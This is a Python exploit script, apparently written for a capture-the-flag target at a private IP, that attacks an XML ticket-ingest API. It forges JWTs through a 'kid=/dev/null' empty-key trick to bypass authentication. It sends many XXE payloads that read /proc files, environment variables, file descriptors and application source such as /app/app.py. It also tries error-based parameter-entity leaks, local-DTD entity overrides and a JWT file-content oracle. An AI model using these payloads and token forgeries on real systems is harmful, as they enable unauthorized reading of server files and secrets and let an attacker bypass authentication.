#!/usr/bin/env python3
"""round65 — Error-based XXE, /proc reads, DTD search, parameter entity tricks"""
import requests, json, time, hashlib, hmac as hm, base64, re

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator"):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}",
           "Content-Type": "application/xml"}

def xxe_post(xml_data):
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml_data.encode('utf-8'), headers=AUTH_OP, timeout=10)
        return r.status_code, r.text
    except Exception as e:
        return -1, str(e)

# ============================================================
print("="*70)
print("PHASE 1: READ /proc FILES (no special chars)")
print("="*70)

proc_files = [
    "/proc/self/maps",
    "/proc/self/smaps_rollup",
    "/proc/self/stat",
    "/proc/self/statm",
    "/proc/self/io",
    "/proc/self/limits",
    "/proc/self/loginuid",
    "/proc/self/sessionid",
    "/proc/self/comm",
    "/proc/self/wchan",
    "/proc/self/oom_score",
    "/proc/self/oom_score_adj",
    "/proc/self/cpuset",
    "/proc/self/personality",
    "/proc/self/schedstat",
    "/proc/self/net/tcp",
    "/proc/self/net/tcp6",
    "/proc/self/net/udp",
    "/proc/self/net/route",
    "/proc/self/net/arp",
    "/proc/self/net/fib_trie",
    "/proc/self/net/dev",
    "/proc/self/net/if_inet6",
    "/proc/self/net/unix",
    "/proc/version",
    "/proc/cpuinfo",
    "/proc/meminfo",
    "/proc/net/tcp",
    "/proc/net/tcp6",
    # Master process (PID 1)
    "/proc/1/comm",
    "/proc/1/stat",
    "/proc/1/maps",
    "/proc/1/io",
    "/proc/1/limits",
    "/proc/1/net/tcp",
    # Worker PIDs
    "/proc/11/comm",
    "/proc/12/comm",
    "/proc/13/comm",
    "/proc/14/comm",
    "/proc/11/maps",
]

for pf in proc_files:
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{pf}">]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>&x;</remarks>
</ticket>'''
    code, text = xxe_post(xml)
    if code == 200:
        try:
            data = json.loads(text)
            content = data.get("summary", {}).get("remarks", "")
            if content and content != "R":
                lines = content.split('\n')
                print(f"\n  [{code}] {pf}: ({len(content)} bytes, {len(lines)} lines)")
                # Print first 30 lines
                for line in lines[:30]:
                    print(f"    {line}")
                if len(lines) > 30:
                    print(f"    ... ({len(lines)-30} more lines)")
        except:
            print(f"  [{code}] {pf}: {text[:200]}")
    elif code == 400:
        print(f"  [{code}] {pf}: EXISTS but has special chars")
    else:
        print(f"  [{code}] {pf}: {text[:100]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: ERROR-BASED XXE — PARAMETER ENTITY EXPANSION")
print("="*70)
print("  Trying to leak file content via XML parse error messages")

# Technique 1: Include file as DTD content via parameter entity
# If file has <, the error message might include surrounding text
error_payloads = [
    # Parameter entity at DTD top level — expands file AS DTD
    (
        "pent-expand",
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % file SYSTEM "file:///app/app.py">
  %file;
]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>R</remarks>
</ticket>'''
    ),
    # Same for entrypoint.sh
    (
        "pent-entrypoint",
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % file SYSTEM "file:///app/entrypoint.sh">
  %file;
]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>R</remarks>
</ticket>'''
    ),
    # Try /proc/self/environ
    (
        "pent-environ",
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % file SYSTEM "file:///proc/self/environ">
  %file;
]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>R</remarks>
</ticket>'''
    ),
    # Try using error entity — file content as URI path
    (
        "err-uri-app",
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % file SYSTEM "file:///app/app.py">
  <!ENTITY % ent "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
  %ent;
  %err;
]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>R</remarks>
</ticket>'''
    ),
    # Nested parameter entity with eval
    (
        "nested-pent",
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % file SYSTEM "file:///app/app.py">
  <!ENTITY % wrapper "<!ENTITY &#x25; all '%file;'>">
  %wrapper;
]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>R</remarks>
</ticket>'''
    ),
    # Try to cause entity recursion with file content
    (
        "recursion-app",
        '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY x SYSTEM "file:///app/app.py">
  <!ENTITY y "&x;&x;">
]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>&y;</remarks>
</ticket>'''
    ),
]

for name, xml in error_payloads:
    code, text = xxe_post(xml)
    print(f"\n  [{code}] {name}:")
    # Show full response for non-standard errors
    if code == 400:
        # Check if error message contains leaked data
        if text != '{"error":"ticket rejected"}' and text != '{"error": "ticket rejected"}':
            print(f"    DIFFERENT ERROR: {text[:500]}")
        else:
            print(f"    Standard 'ticket rejected'")
    elif code == 500:
        print(f"    SERVER ERROR — might leak info: {text[:500]}")
    else:
        print(f"    {text[:300]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: SEARCH FOR LOCAL DTD FILES")
print("="*70)
print("  Checking if DTD files exist via XXE entity resolution")

dtd_candidates = [
    # Common Linux DTD locations
    "/usr/share/xml/fontconfig/fonts.dtd",
    "/usr/share/xml/scrollkeeper/scrollkeeper-omf.dtd",
    "/usr/share/yelp/dtd/docbookx.dtd",
    "/usr/share/sgml/xml.dcl",
    "/usr/share/sgml/docbook/xml-dtd-4.5/docbookx.dtd",
    "/usr/share/sgml/docbook/xml-dtd-4.4/docbookx.dtd",
    "/usr/share/sgml/docbook/xml-dtd-4.3/docbookx.dtd",
    "/usr/share/sgml/docbook/xml-dtd-4.2/docbookx.dtd",
    "/usr/share/sgml/docbook/xml-dtd-4.1/docbookx.dtd",
    "/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd",
    # Ubuntu/Debian specific
    "/usr/share/xml/entities/xml.dtd",
    "/usr/share/xml/iso-num.dtd",
    "/usr/share/doc/libxml2-dev/examples/test.dtd",
    "/usr/share/libxml2/relaxng.dtd",
    # Python XML
    "/usr/lib/python3.11/xml/etree/test.dtd",
    "/usr/lib/python3/dist-packages/lxml/test.dtd",
    # App-specific
    "/etc/xml/catalog",
    "/usr/local/share/xml/catalog",
    # Minimal DTDs that might exist
    "/usr/share/xml/catalog",
    "/usr/share/xml/entities/xml-cdata.dtd",
    "/usr/share/xml/entities/xml-cdata.ent",
    # XHTML DTDs
    "/usr/share/xml/xhtml/xhtml1-strict.dtd",
    "/usr/share/xml/xhtml/xhtml-lat1.ent",
    # SVG DTD
    "/usr/share/xml/svg/svg11.dtd",
    # MathML DTD
    "/usr/share/xml/mathml/mathml2.dtd",
    # GTK/GNOME DTDs
    "/usr/share/gtk-doc/html/glib/glib.dtd",
    # Misc
    "/usr/share/doc/shared-mime-info/shared-mime-info-spec.dtd",
    "/opt/xml/dtd/docbook.dtd",
    "/var/lib/xml/catalog",
]

dtd_found = []
for dtd_path in dtd_candidates:
    # Try reading as entity — 400 means EXISTS (has < in DTD content)
    # Other error might mean doesn't exist
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{dtd_path}">]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>&x;</remarks>
</ticket>'''
    code, text = xxe_post(xml)
    if code == 400:
        # File exists and has < (expected for DTD files)
        dtd_found.append(dtd_path)
        print(f"  EXISTS: {dtd_path}")
    elif code == 200:
        # File readable (unusual for DTD)
        try:
            data = json.loads(text)
            content = data.get("summary", {}).get("remarks", "")
            if content:
                print(f"  READABLE: {dtd_path}: {content[:200]}")
                dtd_found.append(dtd_path)
        except:
            pass

print(f"\n  Found {len(dtd_found)} DTD files")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: LOCAL DTD XXE — OVERRIDE ENTITY TECHNIQUE")
print("="*70)

if dtd_found:
    for dtd_path in dtd_found[:3]:
        print(f"\n  --- Trying {dtd_path} ---")

        # We need to know an entity name defined in the DTD
        # For fonts.dtd, the entity might be "int" or similar
        # Try common entity names
        entity_names = ["int", "expr", "font", "name", "string",
                        "alias", "match", "edit", "test", "family",
                        "accept", "default", "prefer", "config",
                        "fontconfig", "selectfont", "rejectfont",
                        "pattern", "patelt", "const", "or", "and",
                        "bool", "double", "matrix", "range"]

        for ent_name in entity_names:
            xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % local_dtd SYSTEM "file://{dtd_path}">
  <!ENTITY % {ent_name} '
    <!ENTITY &#x25; file SYSTEM "file:///app/app.py">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>R</remarks>
</ticket>'''
            code, text = xxe_post(xml)
            if code != 400 or "ticket rejected" not in text:
                print(f"    Entity '{ent_name}': [{code}] {text[:300]}")
                break
else:
    print("  No DTD files found, trying fonts.dtd technique anyway...")

    xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % expr '
    <!ENTITY &#x25; file SYSTEM "file:///app/app.py">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>R</remarks>
</ticket>'''
    code, text = xxe_post(xml)
    print(f"  [{code}] {text[:300]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: XXE VIA kid JWT PARAMETER — FILE CONTENT ORACLE")
print("="*70)
print("  If kid=/path/to/file, server reads file as HMAC key")
print("  We can test if a file has specific content by signing JWT with that content")

# Test the mechanism: kid=/dev/null uses empty key (already known to work)
# Now try kid=/app/db.py — we KNOW its content!
# Sign JWT with db.py content as key, see if auth works

# First, read db.py content via XXE to verify
xml_db = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file:///app/db.py">]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>&x;</remarks>
</ticket>'''
code, text = xxe_post(xml_db)
db_content = ""
if code == 200:
    try:
        data = json.loads(text)
        db_content = data.get("summary", {}).get("remarks", "")
        print(f"  db.py content ({len(db_content)} bytes): OK")
    except:
        pass

if db_content:
    # Now forge JWT with kid=/app/db.py and key=db_content
    key_bytes = db_content.encode('utf-8')
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/app/db.py"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    token = m+'.'+b64u(hm.new(key_bytes, m.encode(), hashlib.sha256).digest())

    r = S.get(f"{CASPI}/api/auth/me",
              headers={"Authorization": f"Bearer {token}"}, timeout=5)
    print(f"  JWT with kid=/app/db.py, key=db.py content: [{r.status_code}] {r.text[:200]}")

    if r.status_code == 200:
        print("  *** kid FILE READ ORACLE WORKS! ***")
        print("  Now we can verify file contents by signing JWT")

        # Try reading file in binary mode — maybe server reads binary
        key_bytes_raw = db_content.encode('utf-8')  # Same, but let's also try with \n normalization
        for line_end in ['\n', '\r\n']:
            adjusted = db_content.replace('\n', line_end).encode('utf-8')
            m2 = b64u(h)+'.'+b64u(p)
            token2 = m2+'.'+b64u(hm.new(adjusted, m2.encode(), hashlib.sha256).digest())
            r2 = S.get(f"{CASPI}/api/auth/me",
                      headers={"Authorization": f"Bearer {token2}"}, timeout=5)
            if r2.status_code == 200:
                print(f"  With line ending {line_end!r}: [{r2.status_code}] VALID!")
    else:
        # Try binary read — maybe server opens in 'rb' mode
        print(f"  Text mode key didn't work. Server might read file in binary mode ('rb')")
        # The XXE might strip trailing newline or normalize. Try adding \n
        for suffix in ['', '\n', '\r\n']:
            adjusted = (db_content + suffix).encode('utf-8')
            m2 = b64u(h)+'.'+b64u(p)
            token2 = m2+'.'+b64u(hm.new(adjusted, m2.encode(), hashlib.sha256).digest())
            r2 = S.get(f"{CASPI}/api/auth/me",
                      headers={"Authorization": f"Bearer {token2}"}, timeout=5)
            if r2.status_code == 200:
                print(f"  With suffix {suffix!r}: [{r2.status_code}] *** ORACLE WORKS! ***")
                break
        else:
            print("  Oracle approach may not work — key content mismatch")
            print("  (Server might read binary, or XXE normalizes whitespace)")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: ALTERNATIVE FILE PATHS FOR ENVIRON")
print("="*70)

# Try alternative ways to read environment variables
alt_env_paths = [
    "/proc/self/environ",     # null-byte separated (known: 400)
    "/proc/1/environ",        # master process (known: 400)
    "/proc/self/task/1/environ",
    # Symlinks and alternatives
    "/dev/fd/0",              # stdin
    "/dev/fd/1",              # stdout
    "/dev/fd/2",              # stderr
    "/proc/self/fd/0",
    "/proc/self/fd/1",
    "/proc/self/fd/2",
    "/proc/self/fd/3",
    "/proc/self/fd/4",
    "/proc/self/fd/5",
    "/proc/self/fd/6",
    "/proc/self/fd/7",
    "/proc/self/fd/8",
    "/proc/self/fd/9",
    "/proc/self/fd/10",
    "/proc/self/fd/11",
    "/proc/self/fd/12",
    "/proc/self/fd/255",
    # Maybe there's a file that contains env dump
    "/proc/self/attr/current",
    "/proc/self/attr/exec",
    "/proc/self/attr/fscreate",
    "/proc/self/attr/keycreate",
    "/proc/self/attr/prev",
    "/proc/self/attr/sockcreate",
    "/proc/self/coredump_filter",
    "/proc/self/autogroup",
    "/proc/self/uid_map",
    "/proc/self/gid_map",
    # Docker/container
    "/proc/1/cgroup",
    "/proc/1/mountinfo",
    # cmdline (has null bytes between args)
    "/proc/self/cmdline",
    "/proc/1/cmdline",
]

for path in alt_env_paths:
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>&x;</remarks>
</ticket>'''
    code, text = xxe_post(xml)
    if code == 200:
        try:
            data = json.loads(text)
            content = data.get("summary", {}).get("remarks", "")
            if content:
                print(f"  [{code}] {path}: {content[:300]}")
            else:
                pass  # Empty
        except:
            pass
    elif code == 400:
        pass  # Known: has special chars
    else:
        print(f"  [{code}] {path}: {text[:100]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: LARGE FIELD XXE — REFERENCE + CARRIER + REMARKS ALL READING SAME FILE")
print("="*70)
print("  Maybe reading into multiple fields at once reveals something")

# Read db.py into all 3 fields simultaneously
xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file:///app/gunicorn.conf.py">]>
<ticket>
  <reference>&x;</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>&x;</carrier><remarks>&x;</remarks>
</ticket>'''
code, text = xxe_post(xml)
print(f"  Multi-field gunicorn.conf.py: [{code}] {text[:300]}")

# What about reading /app/app.py into ALL 3 fields?
# Maybe one field has different length limit that leaks a prefix?
xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file:///app/app.py">]>
<ticket>
  <reference>&x;</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>&x;</grossVolume><netVolume>&x;</netVolume>
  <density>&x;</density><temperature>&x;</temperature>
  <carrier>&x;</carrier><remarks>&x;</remarks>
</ticket>'''
code, text = xxe_post(xml)
print(f"  Multi-field app.py: [{code}] {text[:300]}")

print("\n"+"="*70)
print("DONE")
print("="*70)
